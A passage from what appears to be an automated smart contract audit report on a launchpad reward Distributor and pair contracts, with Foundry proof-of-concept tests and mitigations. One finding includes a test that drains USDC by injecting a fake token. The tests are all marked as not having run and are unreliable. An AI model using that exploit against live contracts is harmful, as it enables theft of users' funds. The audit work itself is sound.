4. `update` sees `totalShares` is 0 (pre-stake). `getAccRewards` returns 0 change.
5. `update` deletes `pendingBaseRewards` (sets to 0).
6. User A's stake is processed. `accRewardPerShare` is still 0.
7. The 100 reward tokens are stuck in the contract but untracked.

## Proof of Code
function testRewardsPermanentlyLostIfNoShares() public {
    // 1. Initialize pool with 0 shares
    tracker.initializePair(address(token0), address(token1));

    // 2. Add rewards (push-based)
    // This increases `pendingBaseRewards` in storage
    uint128 rewardAmount = 100e18;
    tracker.addBaseRewards(address(token0), rewardAmount);

    // Verify pending is set
    (,,uint128 pendingBase,,,) = tracker.getRewardsPoolData();
    assertEq(pendingBase, rewardAmount);

    // 3. First user stakes
    // `stake` calls `update()` internally BEFORE adding the new shares.
    // `update()` sees 0 totalShares, so it calculates 0 increase in accumulator,
    // BUT it deletes `pendingBaseRewards`.
    address userA = address(0x1);
    tracker.stake(userA, 10e18);

    // 4. Check state after stake
    (,,uint128 pendingBaseAfter,,,) = tracker.getRewardsPoolData();
    (uint256 accBasePerShare,) = tracker.getAccRewardsPerShare();

    // BUG: Pending rewards deleted...
    assertEq(pendingBaseAfter, 0, "Pending rewards should be 0 (wiped)");
    // ...but Accumulator did not increase because shares were 0
    assertEq(accBasePerShare, 0, "Accumulator should be 0");

    // 5. Verify user receives nothing on claim
    (uint256 claimedBase,) = tracker.claim(userA);
    assertEq(claimedBase, 0, "User A should have received rewards but got 0");
}

## Suggested Mitigation
Modify `RewardsTrackerLib.update` to only clear pending rewards if `totalShares > 0`. If shares are zero, the rewards should remain pending until a user stakes.

```solidity
function update(RewardPoolData storage self)
    internal
    returns (uint256 newAccBaseRewardsPerShare, uint256 newAccQuoteRewardsPerShare)
{
    (newAccBaseRewardsPerShare, newAccQuoteRewardsPerShare) = getAccRewardsPerShare(self);

    // FIX: Only distribute/delete pending rewards if there are shares to receive them
    if (self.totalShares > 0) {
        if (self.pendingBaseRewards > 0) {
            self.accBaseRewardPerShare = newAccBaseRewardsPerShare;
            delete self.pendingBaseRewards;
        }

        if (self.pendingQuoteRewards > 0) {
            self.accQuoteRewardPerShare = newAccQuoteRewardsPerShare;
            delete self.pendingQuoteRewards;
        }
    }
}
```


## [M-7]. Accrued Launchpad Fees permanently lost in `endRewardsAccrual`

### Finding Severity Justification: The function `endRewardsAccrual` explicitly deletes the fee tracking variables `accruedLaunchpadFee0` and `accruedLaunchpadFee1` before calling `_update`. The `_update` function relies on these variables to calculate the `totalLaunchpadFee` and trigger distribution. Consequently, any fees accrued since the last distribution (specifically fees generated by trades in the last active block after the first transaction) are permanently lost/donated to the liquidity pool reserves instead of being sent to the Distributor. While the loss is capped to the fees of a single block (as distribution occurs on the first interaction of a new block), it represents a definite loss of yield/assets for the Distributor.
## Derived From Pattern/Invariant
AccountingInvariantViolation

## Exploit Type
AccountingInvariantViolation

## Location
GTELaunchpadV2Pair.endRewardsAccrual

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 2
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:RequiresRole


## Description
The `endRewardsAccrual` function deletes `accruedLaunchpadFee0` and `accruedLaunchpadFee1` before calling `_update` with zero new fees. This effectively removes the accrued fees from the special fee accounting and leaves them in the general contract balance. Since `_update` sets `reserve = balance`, these tokens are absorbed into the liquidity pool reserves, effectively donating the Distributor's earned fees to the Liquidity Providers.

## Impact
Loss of assets; Distributor loses accrued fees upon rewards deactivation.

## Command to Run Test


## Proof of Concept
1. Fees accrue: `accruedLaunchpadFee0 = 50`.
2. `endRewardsAccrual` is called.
3. `delete accruedLaunchpadFee0` executes.
4. `_update` runs. `reserve` becomes `balance`. The 50 tokens are now part of the LP backing.
5. Distributor balance does not increase.

## Proof of Code
import "forge-std/Test.sol";
import {GTELaunchpadV2Pair} from "../contracts/launchpad/uniswap/GTELaunchpadV2Pair.sol";
import {IERC20} from "@gte-univ2-core/interfaces/IERC20.sol";

contract MockERC20 {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    function mint(address to, uint256 value) public { balanceOf[to] += value; }
    function approve(address spender, uint256 value) public returns (bool) { allowance[msg.sender][spender] = value; return true; }
    function transfer(address to, uint256 value) public returns (bool) { return transferFrom(msg.sender, to, value); }
    function transferFrom(address from, address to, uint256 value) public returns (bool) {
        balanceOf[from] -= value;
        balanceOf[to] += value;
        return true;
    }
}

contract MockDistributor {
    function addRewards(address t0, address t1, uint128 a0, uint128 a1) external {
        if (a0 > 0) IERC20(t0).transferFrom(msg.sender, address(this), a0);
        if (a1 > 0) IERC20(t1).transferFrom(msg.sender, address(this), a1);
    }
}

contract LostFeesTest is Test {
    GTELaunchpadV2Pair pair;
    MockERC20 token0;
    MockERC20 token1;
    MockDistributor distributor;
    address lpProvider = address(0x111);
    address swapper = address(0x222);

    function setUp() public {
        token0 = new MockERC20();
        token1 = new MockERC20();
        distributor = new MockDistributor();
        if (address(token0) > address(token1)) (token0, token1) = (token1, token0);
        
        pair = new GTELaunchpadV2Pair();
        pair.initialize(address(token0), address(token1), lpProvider, address(distributor));

        token0.mint(lpProvider, 10000e18);
        token1.mint(lpProvider, 10000e18);
        token0.mint(swapper, 1000e18);
    }

    function testLostFeesOnEnd() public {
        // 1. Add Liquidity
        vm.startPrank(lpProvider);
        token0.transfer(address(pair), 1000e18);
        token1.transfer(address(pair), 1000e18);
        pair.mint(lpProvider);
        vm.stopPrank();

        // 2. Swap to accrue fees
        vm.startPrank(swapper);
        token0.transfer(address(pair), 100e18);
        pair.swap(0, 50e18, swapper, "");
        vm.stopPrank();

        (uint112 acc0, uint112 acc1,) = pair.getAccruedLaunchpadFees();
        assertTrue(acc0 > 0 || acc1 > 0, "Fees must accrue");

        uint256 distBalBefore = token0.balanceOf(address(distributor));

        // 3. End Rewards Accrual
        vm.prank(address(distributor));
        pair.endRewardsAccrual();

        // 4. Verify loss
        (uint112 acc0After,,) = pair.getAccruedLaunchpadFees();
        assertEq(acc0After, 0, "Accrued fees should be cleared");
        assertEq(token0.balanceOf(address(distributor)), distBalBefore, "Distributor received nothing - fees lost");
    }
}

## Suggested Mitigation
function endRewardsAccrual() external {
    if (msg.sender != launchpadFeeDistributor) revert("GTEUniV2: FORBIDDEN");

    // FIX: Distribute any pending fees before clearing variables
    _distributeLaunchpadFees(accruedLaunchpadFee0, accruedLaunchpadFee1);

    // There are no more shares, so prevent distribution and accrual of any remaining rewards
    delete accruedLaunchpadFee0;
    delete accruedLaunchpadFee1;
    delete rewardsPoolActive;

    _update(
        IERC20(token0).balanceOf(address(this)),
        IERC20(token1).balanceOf(address(this)),
        reserve0,
        reserve1,
        uint112(0),
        uint112(0)
    );

    emit RewardsPoolDeactivated();
}





 **Derived From** : AccessControlOrAuthByPass

## [H-8]. Missing input validation in addRewards allows reward pool drainage via malicious token injection

### Finding Severity Justification: The vulnerability allows an attacker to artificially inflate the reward accumulators of a legitimate reward pool by injecting a worthless token disguised as the quote asset. Since the Distributor contract often holds the same quote asset (e.g., USDC) for multiple pools, and the `totalPendingRewards` mapping aggregates these balances per asset, an attacker can successfully claim and withdraw USDC that belongs to other users or other pools. This constitutes a direct theft of user funds.
## Derived From Pattern/Invariant
AccessControlOrAuthByPass

## Exploit Type
AccessControl

## Location
Distributor.addRewards

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 1
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The `addRewards` function identifies the reward pool using one of the provided tokens (`token0` or `token1`) but fails to verify that the *other* token matches the pool's configured `quoteAsset`. An attacker can call `addRewards` passing the valid LaunchToken (to resolve the pool) and a worthless malicious token (as `token1`). The contract sets `quoteAsset = token1` locally, accepts the malicious token transfer, and calls `rs.addQuoteRewards`. This increases the pool's `accQuoteRewardPerShare` and `pendingQuoteRewards`, which are used to calculate liabilities for the *real* quote asset (e.g., USDC). Users can then claim these inflated rewards, draining the legitimate USDC from the contract.

## Impact
Theft of all quote asset rewards (e.g., USDC) held by the Distributor.

## Command to Run Test


## Proof of Concept
1. Assume a reward pool exists for LaunchToken/USDC. 2. Attacker creates a worthless ERC20 'FakeToken'. 3. Attacker calls `addRewards(LaunchToken, FakeToken, 0, 1e18)`. 4. Contract resolves pool via LaunchToken. It sees `token0` is base, so it assumes `token1` (FakeToken) is quote. 5. It calls `addQuoteRewards(..., 1e18)`. `accQuoteRewardPerShare` increases as if 1e18 USDC was added. 6. Attacker (or any staker) calls `claimRewards`. The pending amount is calculated using the inflated accumulator against the *real* quote asset (USDC). 7. `_distributeAssets` transfers real USDC to the user.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

import {Test} from "forge-std/Test.sol";
import {Distributor} from "contracts/launchpad/Distributor.sol";

// Minimal Mock ERC20 for testing
contract MockERC20 {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    uint8 public decimals;

    constructor(string memory, string memory, uint8 _decimals) { decimals = _decimals; }
    function mint(address to, uint256 amount) public { balanceOf[to] += amount; }
    function approve(address spender, uint256 amount) public returns (bool) { allowance[msg.sender][spender] = amount; return true; }
    function transfer(address to, uint256 amount) public returns (bool) { return transferFrom(msg.sender, to, amount); }
    function transferFrom(address from, address to, uint256 amount) public returns (bool) {
        if (from != msg.sender) allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract DistributorExploitTest is Test {
    Distributor distributor;
    MockERC20 launchToken;
    MockERC20 otherToken;
    MockERC20 usdc;
    MockERC20 fakeToken;
    address launchpad = address(0xABC);
    address alice = address(0x123);

    function setUp() public {
        distributor = new Distributor();
        distributor.initialize(launchpad);

        launchToken = new MockERC20("Launch", "LCH", 18);
        otherToken = new MockERC20("Other", "OTH", 18);
        usdc = new MockERC20("USDC", "USDC", 6);
        fakeToken = new MockERC20("Fake", "FAKE", 18);

        vm.startPrank(launchpad);
        // Create victim pool (Other/USDC) and target pool (Launch/USDC)
        distributor.createRewardsPair(address(launchToken), address(usdc));
        distributor.createRewardsPair(address(otherToken), address(usdc));
        // Alice stakes in the target pool
        distributor.increaseStake(address(launchToken), alice, 100e18);
        vm.stopPrank();
    }

    function test_addRewards_DrainRewards() public {
        // 1. Legitimate rewards exist in the Distributor for the 'Other' pool
        // This sets totalPendingRewards[USDC] > 0
        uint128 realReward = 1000e6; // 1000 USDC
        usdc.mint(address(this), realReward);
        usdc.approve(address(distributor), realReward);
        distributor.addRewards(address(otherToken), address(usdc), 0, realReward);

        // 2. Attack: Inject 'fake' rewards into LaunchToken pool
        // The Distributor holds USDC for 'Other', but we will claim it via 'Launch'
        uint128 fakeAmount = 1000e6; // Matches amount to drain
        fakeToken.mint(address(this), fakeAmount);
        fakeToken.approve(address(distributor), fakeAmount);

        // Call addRewards using (LaunchToken, FakeToken). 
        // Logic resolves pool via LaunchToken, then mistakenly accepts FakeToken as quote.
        distributor.addRewards(address(launchToken), address(fakeToken), 0, fakeAmount);

        // 3. Alice claims from LaunchToken pool
        // The system believes Alice is owed 1000 units of quote asset (USDC)
        uint256 balBefore = usdc.balanceOf(alice);
        vm.prank(alice);
        distributor.claimRewards(address(launchToken));
        uint256 balAfter = usdc.balanceOf(alice);

        // 4. Verify theft: Alice received USDC despite the pool only receiving FakeToken
        assertEq(balAfter - balBefore, fakeAmount);
        assertEq(usdc.balanceOf(address(distributor)), 0);
    }
}

## Suggested Mitigation
Update `addRewards` to strictly validate that the non-launch asset matches the pool's configured quote asset:

```solidity
    function addRewards(address token0, address token1, uint128 amount0, uint128 amount1) external {
        (address launchAsset, address quoteAsset, uint128 launchAssetAmount, uint128 quoteAssetAmount) =
            (token0, token1, amount0, amount1);
        RewardPoolData storage rs = RewardsTrackerStorage.getRewardPool(token0);

        if (rs.quoteAsset == address(0)) {
            rs = RewardsTrackerStorage.getRewardPool(token1);

            if (rs.quoteAsset == address(0)) revert RewardsDoNotExist();

            (launchAsset, quoteAsset, launchAssetAmount, quoteAssetAmount) = (token1, token0, amount1, amount0);
        }

        // NEW CHECK: Ensure the provided quote asset matches the pool's actual quote asset
        if (quoteAsset != rs.quoteAsset) revert("Invalid quote asset");

        if (rs.totalShares == 0) revert NoSharesToIncentivize();
        // ... rest of function
```





 **Derived From** : Dos

## [M-9]. `Distributor.endRewards` permanently disables Pair fee accrual upon graduation

### Finding Severity Justification: The finding describes a permanent breakage of the Launchpad fee accrual mechanism, which means stakers will receive zero yield from trading fees. However, according to the Code4rena severity rubric, loss of 'Unmatured yield' or 'in-motion yield' is explicitly capped at Medium severity. Since the fees are never collected (and thus never matured), this qualifies as unmatured yield loss. While the functional impact is significant (breaking a core incentive), it does not result in the direct loss of user principal or matured assets.
## Derived From Pattern/Invariant
Dos

## Exploit Type
Dos

## Location
Distributor.endRewards

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 2
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:RequiresRole


## Description
The `Distributor.endRewards` function calls `pair.endRewardsAccrual()`. This function sets `rewardsPoolActive = 0` on the `GTELaunchpadV2Pair`. According to the protocol workflow, `endRewards` is called by the Launchpad upon graduation (when the pair is created and trading goes live). 

However, `GTELaunchpadV2Pair` only accrues fees for the distributor if `rewardsPoolActive > 0`. By setting it to 0 at the exact moment the pair goes live, the protocol permanently disables the fee generation mechanism that is supposed to feed the Distributor. Stakers receive zero yield from trading fees.

## Impact
The core value proposition (Launchpad stakers earning trading fees) is broken. The Distributor receives no fees from the Pair.

## Command to Run Test


## Proof of Concept
1. Launchpad calls `Distributor.endRewards(pair)` at graduation.
2. `Distributor` calls `pair.endRewardsAccrual()`.
3. Pair sets `rewardsPoolActive = 0`.
4. Users swap on Pair.
5. `_getLaunchpadFees` checks `rewardsPoolActive > 0`. It is false.
6. `fee0` and `fee1` returned are 0.
7. No fees are sent to Distributor.

## Proof of Code
function testEndRewardsBricksFees() public {
    // 1. Setup
    Distributor distributor = new Distributor();
    distributor.initialize(address(this)); // Test contract acts as Launchpad

    MockERC20 token0 = new MockERC20();
    MockERC20 token1 = new MockERC20();
    
    // Deploy Pair directly to simulate Factory creation
    GTELaunchpadV2Pair pair = new GTELaunchpadV2Pair();
    // Initialize pair: tokens, lpVault (dummy), distributor
    pair.initialize(address(token0), address(token1), address(0xDEAD), address(distributor));

    // 2. Verify active initially
    assertEq(pair.rewardsPoolActive(), 1, "Rewards pool should be active initially");

    // 3. Launchpad (this) calls endRewards upon graduation
    distributor.endRewards(pair);

    // 4. Verify deactivated
    assertEq(pair.rewardsPoolActive(), 0, "Rewards pool should be deactivated");

    // 5. Perform swap to prove fee accrual failure
    token0.mint(address(pair), 100 ether);
    token1.mint(address(pair), 100 ether);
    pair.sync();

    token0.mint(address(this), 1 ether);
    token0.transfer(address(pair), 1 ether);
    
    // Swap triggers _update -> _getLaunchpadFees
    pair.swap(0, 0.5 ether, address(this), "");

    // Check fees
    (uint112 fee0, uint112 fee1, ) = pair.getAccruedLaunchpadFees();
    assertEq(fee0, 0, "Fee0 should be 0");
    assertEq(fee1, 0, "Fee1 should be 0");
}

## Suggested Mitigation
Remove the `endRewards` function in `Distributor` entirely, or remove the call to `pair.endRewardsAccrual()` within it. The `GTELaunchpadV2Pair` should remain in `rewardsPoolActive = 1` state indefinitely after graduation to allow fee accrual for stakers.


## [M-10]. DoS of Staking/Exit via Griefable Reward Transfer

### Finding Severity Justification: The Distributor contract tightly couples the withdrawal of the principal asset (unstaking) with the transfer of reward tokens. If the reward token transfer fails (e.g., due to a USDC blacklist or global pause), the entire transaction reverts. This results in the user's principal assets being locked in the contract, denying them the ability to exit their position. This constitutes a Denial of Service and a loss of availability for user funds based on external dependencies.
## Derived From Pattern/Invariant
Dos

## Exploit Type
Dos

## Location
Distributor.decreaseStake

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 2
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The `increaseStake` and `decreaseStake` functions in `Distributor` mandatorily claim and transfer pending rewards via `_distributeAssets`. If the reward token transfer fails (e.g., due to a USDC blacklist, pause, or malicious hook), the entire transaction reverts. This allows a third-party token state to Denial-of-Service critical user actions like exiting a position (`decreaseStake`) or buying more tokens (`increaseStake`).

## Impact
Users may be unable to unstake their assets if the reward token is paused or reverts.

## Command to Run Test


## Proof of Concept
1. User has accrued USDC rewards. 2. USDC blacklists User (or USDC pauses). 3. User tries to `unstake` (via Launchpad `sell` or direct exit). 4. `decreaseStake` attempts `safeTransfer` of USDC. 5. Revert. User is stuck.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {Distributor} from "../contracts/Distributor.sol"; 
// Assuming standard mock or creating one inline for clarity

contract MockRevertingToken {
    mapping(address => uint256) public balanceOf;
    bool public shouldRevert;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address, uint256) external view returns (bool) {
        if (shouldRevert) revert("Token Paused/Blacklisted");
        return true;
    }
    
    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function setRevert(bool _r) external { shouldRevert = _r; }
}

contract DistributorDoS is Test {
    Distributor distributor;
    MockRevertingToken launchToken;
    MockRevertingToken quoteToken;
    address launchpad = makeAddr("launchpad");
    address alice = makeAddr("alice");

    function setUp() public {
        distributor = new Distributor();
        launchToken = new MockRevertingToken();
        quoteToken = new MockRevertingToken();
        
        distributor.initialize(launchpad);
        
        vm.prank(launchpad);
        distributor.createRewardsPair(address(launchToken), address(quoteToken));
    }

    function test_GriefableExit() public {
        // 1. Simulate Alice staking 100 tokens via Launchpad
        uint96 stakeAmount = 100e18;
        vm.prank(launchpad);
        distributor.increaseStake(address(launchToken), alice, stakeAmount);

        // 2. Add Rewards to the pool to generate pending rewards for Alice
        uint128 rewardAmount = 1000e6;
        quoteToken.mint(address(this), rewardAmount);
        quoteToken.transferFrom(address(this), address(distributor), rewardAmount);
        distributor.addRewards(address(launchToken), address(quoteToken), 0, rewardAmount);

        // 3. Simulate external condition: Reward token (Quote) pauses or blacklists Alice
        quoteToken.setRevert(true);

        // 4. Alice tries to unstake (exit position)
        // Expectation: The transaction reverts because the reward transfer fails, locking her principal.
        vm.startPrank(launchpad);
        vm.expectRevert("Token Paused/Blacklisted");
        distributor.decreaseStake(address(launchToken), alice, stakeAmount);
        vm.stopPrank();
    }
}

## Suggested Mitigation
Modify `_distributeAssets` to handle transfer failures gracefully. Instead of strictly reverting via `safeTransfer`, use a low-level call. If the transfer fails, do not revert the transaction; instead, record the failed amount in a `pendingWithdrawals[user][token]` mapping and emit an event. Add a new function `claimPendingWithdrawals(token)` to allow users to retrieve these funds later. This decouples the principal exit from the availability of the reward token.





 **Derived From** : UnsafeRecipient

## [H-11]. Rewards sent to Launchpad instead of User during stake modification

### Finding Severity Justification: The finding identifies a definite and direct loss of user assets (yield/rewards). The `Distributor` contract calculates pending rewards for a specific user (`account`) during stake modification but transfers the tokens to `msg.sender`. Since `increaseStake` and `decreaseStake` are restricted to `onlyLaunchpad`, `msg.sender` is always the Launchpad contract. The Launchpad contract is not designed to receive or forward these user-specific rewards during this call flow, causing the funds to be permanently stuck in the Launchpad contract and lost to the user.
## Derived From Pattern/Invariant
UnsafeRecipient

## Exploit Type
StandardViolation

## Location
Distributor._distributeAssets

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 2
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:RequiresRole


## Description
In `increaseStake` and `decreaseStake`, which are called by the `Launchpad` contract, any accrued rewards for the `account` are claimed via `_distributeAssets`. This function transfers the rewards to `msg.sender` (the Launchpad). Unless the Launchpad explicitly handles receiving and forwarding these arbitrary tokens (which is not standard behavior for such calls), the rewards will be stuck in the Launchpad contract. Users lose their accrued yield whenever they modify their stake.

## Impact
Loss of user funds/yield. Rewards are sent to the Launchpad contract instead of the user.

## Command to Run Test


## Proof of Concept
1. User has accrued rewards. 
2. Launchpad calls `distributor.increaseStake(asset, user, amount)`. 
3. `Distributor` claims rewards for `user`. 
4. `_distributeAssets` calls `token.safeTransfer(msg.sender, amount)`. 
5. `msg.sender` is Launchpad. Funds sent there.

## Proof of Code
import {Test, console} from "forge-std/Test.sol";
import {Distributor} from "contracts/launchpad/Distributor.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract MockERC20 is ERC20 {
    constructor(string memory name, string memory symbol) ERC20(name, symbol) {}
    function mint(address to, uint256 amount) external { _mint(to, amount); }
}

contract DistributorRewardsTest is Test {
    Distributor distributor;
    MockERC20 launchAsset;
    MockERC20 quoteAsset;
    address launchpad = makeAddr("launchpad");
    address user = makeAddr("user");

    function setUp() public {
        distributor = new Distributor();
        launchAsset = new MockERC20("Launch", "LCH");
        quoteAsset = new MockERC20("Quote", "QTE");
        
        distributor.initialize(launchpad);
        
        // Setup reward pair
        vm.prank(launchpad);
        distributor.createRewardsPair(address(launchAsset), address(quoteAsset));
    }

    function testRewardsSentToLaunchpad() public {
        // 1. User gets initial stake (via Launchpad)
        uint96 stakeAmount = 100e18;
        vm.prank(launchpad);
        distributor.increaseStake(address(launchAsset), user, stakeAmount);

        // 2. Rewards accrue in the pool
        uint128 rewardAmount = 50e18;
        launchAsset.mint(address(this), rewardAmount);
        launchAsset.approve(address(distributor), rewardAmount);
        distributor.addRewards(address(launchAsset), address(quoteAsset), rewardAmount, 0);

        // 3. User modifies stake (increase or decrease) via Launchpad
        // This triggers '_distributeAssets' for the pending rewards
        uint96 newStake = 10e18;
        uint256 userBalanceBefore = launchAsset.balanceOf(user);
        uint256 launchpadBalanceBefore = launchAsset.balanceOf(launchpad);

        vm.prank(launchpad);
        distributor.increaseStake(address(launchAsset), user, newStake);

        // 4. Verify destination of rewards
        uint256 userBalanceAfter = launchAsset.balanceOf(user);
        uint256 launchpadBalanceAfter = launchAsset.balanceOf(launchpad);

        // BUG: User received 0 rewards
        assertEq(userBalanceAfter - userBalanceBefore, 0, "User should have received rewards but got 0");
        // BUG: Launchpad received the rewards (msg.sender)
        assertEq(launchpadBalanceAfter - launchpadBalanceBefore, rewardAmount, "Launchpad incorrectly received rewards");
    }
}

## Suggested Mitigation
Modify `_distributeAssets` to accept a `recipient` parameter instead of relying on `msg.sender`. Update call sites in `increaseStake` and `decreaseStake` to pass the `account` as the recipient, and `claimRewards` to pass `msg.sender`.

```solidity
function _distributeAssets(address recipient, address base, uint256 baseAmount, address quote, uint256 quoteAmount) internal {
    if (baseAmount > 0) {
        _decreaseTotalPending(base, baseAmount);
        base.safeTransfer(recipient, baseAmount);
    }
    if (quoteAmount > 0) {
        _decreaseTotalPending(quote, quoteAmount);
        quote.safeTransfer(recipient, quoteAmount);
    }
}
```





 **Derived From** : StandardViolation

## [H-12]. Rewards sent to Launchpad instead of User during stake modification

### Finding Severity Justification: The vulnerability results in the permanent loss of matured yield (accrued rewards) for users who increase or decrease their stake (e.g., buy or sell tokens) via the Launchpad. The `Distributor` contract incorrectly transfers these rewards to the Launchpad contract (`msg.sender`) instead of the user (`account`). According to the Code4rena rubric, loss of matured yield is classified as High severity, equivalent to loss of capital.
## Derived From Pattern/Invariant
StandardViolation

## Exploit Type
StandardViolation

## Location
Distributor.increaseStake

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 2
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:RequiresRole


## Description
The `Distributor.increaseStake` function (called by Launchpad during `buy`) automatically claims pending rewards for the user. However, it calls `_distributeAssets` which transfers the rewards to `msg.sender` (the Launchpad contract) via `base.safeTransfer(msg.sender, baseAmount)`. Unless the Launchpad has specific logic to receive and forward these tokens (which is not standard), the rewards are effectively lost to the Launchpad contract.

## Impact
Users permanently lose accrued rewards when increasing their stake (buying) or decreasing their stake (selling) via the Launchpad. The `Distributor` correctly calculates the rewards but incorrectly transfers them to the `msg.sender` (the Launchpad contract) instead of the `account` (the User), resulting in a total loss of yield for the user.

## Command to Run Test


## Proof of Concept
1. A User has `100` shares staked in the `Distributor` for a specific `launchAsset`.
2. Rewards (e.g., `10 ETH`) are added to the pool; the User is entitled to these rewards.
3. The User decides to buy more tokens or sell existing tokens via the `Launchpad`.
4. The `Launchpad` contract calls `Distributor.increaseStake(asset, user, shares)` or `decreaseStake`.
5. These functions internally trigger a reward claim for the User's existing shares.
6. The `_distributeAssets` function is called to transfer the rewards.
7. `_distributeAssets` transfers the rewards to `msg.sender`. Since the caller is the `Launchpad` contract, the rewards are sent to the Launchpad address.
8. The User receives `0` rewards; the Launchpad contract receives `10 ETH` (which are likely permanently locked).

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

import {Test} from "forge-std/Test.sol";
import {Distributor} from "contracts/launchpad/Distributor.sol";
import {MockERC20} from "solady/test/utils/MockERC20.sol";

contract RewardsSentToLaunchpadTest is Test {
    Distributor distributor;
    MockERC20 launchAsset;
    MockERC20 quoteAsset;
    
    address launchpad = address(0x1337);
    address user = address(0xCAFE);

    function setUp() public {
        launchAsset = new MockERC20("Launch", "LCH", 18);
        quoteAsset = new MockERC20("Quote", "QTE", 18);
        
        distributor = new Distributor();
        distributor.initialize(launchpad);

        // Initialize rewards pair via Launchpad
        vm.prank(launchpad);
        distributor.createRewardsPair(address(launchAsset), address(quoteAsset));

        // Fund distributor for payout
        launchAsset.mint(address(distributor), 1000 ether);
    }

    function test_RewardsSentToLaunchpad() public {
        // 1. User obtains initial stake via Launchpad
        vm.prank(launchpad);
        distributor.increaseStake(address(launchAsset), user, 100 ether);

        // 2. Accrue rewards in the pool
        // We mint tokens to 'this' and add them as rewards to the Distributor
        // This updates the accumulator so the user is now owed rewards
        launchAsset.mint(address(this), 10 ether);
        launchAsset.approve(address(distributor), 10 ether);
        distributor.addRewards(address(launchAsset), address(quoteAsset), 10 ether, 0);

        // 3. User buys more tokens (Launchpad calls increaseStake)
        // This should claim the pending 10 ether rewards for the user
        uint256 userBalanceBefore = launchAsset.balanceOf(user);
        uint256 launchpadBalanceBefore = launchAsset.balanceOf(launchpad);

        vm.prank(launchpad);
        distributor.increaseStake(address(launchAsset), user, 50 ether);

        uint256 userBalanceAfter = launchAsset.balanceOf(user);
        uint256 launchpadBalanceAfter = launchAsset.balanceOf(launchpad);

        // 4. FAILURE: User balance did not increase, Launchpad balance did
        assertEq(userBalanceAfter, userBalanceBefore, "User did not receive rewards");
        assertGt(launchpadBalanceAfter, launchpadBalanceBefore, "Launchpad received the rewards incorrectly");
        assertEq(launchpadBalanceAfter - launchpadBalanceBefore, 10 ether, "Launchpad received exactly the user's rewards");
    }
}

## Suggested Mitigation
Modify the `_distributeAssets` function to accept an explicit `recipient` argument instead of using `msg.sender`. Update `increaseStake` and `decreaseStake` to pass `account` as the recipient, and `claimRewards` to pass `msg.sender`.

```diff
-   function _distributeAssets(address base, uint256 baseAmount, address quote, uint256 quoteAmount) internal {
+   function _distributeAssets(address base, uint256 baseAmount, address quote, uint256 quoteAmount, address recipient) internal {
        if (baseAmount > 0) {
            _decreaseTotalPending(base, baseAmount);
-           base.safeTransfer(msg.sender, baseAmount);
+           base.safeTransfer(recipient, baseAmount);
        }

        if (quoteAmount > 0) {
            _decreaseTotalPending(quote, quoteAmount);
-           quote.safeTransfer(msg.sender, quoteAmount);
+           quote.safeTransfer(recipient, quoteAmount);
        }
    }

    function increaseStake(...) external onlyLaunchpad ... {
        ...
-       _distributeAssets(launchAsset, baseAmount, rs.quoteAsset, quoteAmount);
+       _distributeAssets(launchAsset, baseAmount, rs.quoteAsset, quoteAmount, account);
    }
    
    function decreaseStake(...) external onlyLaunchpad ... {
        ...
-       _distributeAssets(launchAsset, baseAmount, rs.quoteAsset, quoteAmount);
+       _distributeAssets(launchAsset, baseAmount, rs.quoteAsset, quoteAmount, account);
    }

    function claimRewards(...) external ... {
        ...
-       _distributeAssets(launchAsset, baseAmount, rs.quoteAsset, quoteAmount);
+       _distributeAssets(launchAsset, baseAmount, rs.quoteAsset, quoteAmount, msg.sender);
    }
```


## [M-13]. Permanent DoS on USDT pairs due to Unsafe Approval in Fee Distribution

### Finding Severity Justification: The finding identifies a valid incompatibility with USDT's non-standard `approve` function (reverting when approving a non-zero value over a non-zero allowance). While the impact is a Denial of Service (DoS) of the liquidity pool, the likelihood depends on the trusted `Distributor` contract failing to consume the exact approved amount (e.g., due to partial usage, pausing logic that returns early, or upgrades). Additionally, the DoS is recoverable by the Distributor admin calling `endRewardsAccrual` to disable the faulty reward distribution path, thereby unblocking the pool. High Impact + Low Likelihood + Recoverability = Medium.
## Derived From Pattern/Invariant
StandardViolation

## Exploit Type
StandardViolation

## Location
GTELaunchpadV2Pair._distributeLaunchpadFees

## Finding Status: Valid
## Status Confidence: Confident
### Finding Complexity: 2
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The `_distributeLaunchpadFees` function calls `_safeApprove` to approve the Distributor to spend `fee0`. This uses the low-level `call` to `approve`. Tokens like USDT revert if `approve` is called with a non-zero value when the current allowance is already non-zero. If the Distributor does not consume the exact allowance (e.g. due to partial use or residual dust), subsequent calls to `_update` (via mint/burn/swap) will fail as `_safeApprove` reverts. This bricks the pair.

## Impact
Denial of Service; Liquidity Pool becomes unusable for USDT pairs.

## Command to Run Test


## Proof of Concept
1. Create pair with USDT.
2. Accrue fees. `_update` calls `approve(distributor, 100)`.
3. Distributor consumes only 99 (or 0 if paused).
4. Next swap triggers `_update`.
5. `_update` calls `approve(distributor, 50)`.
6. USDT contract reverts because allowance is 1 (non-zero).
7. Transaction fails.

## Proof of Code
import "forge-std/Test.sol";
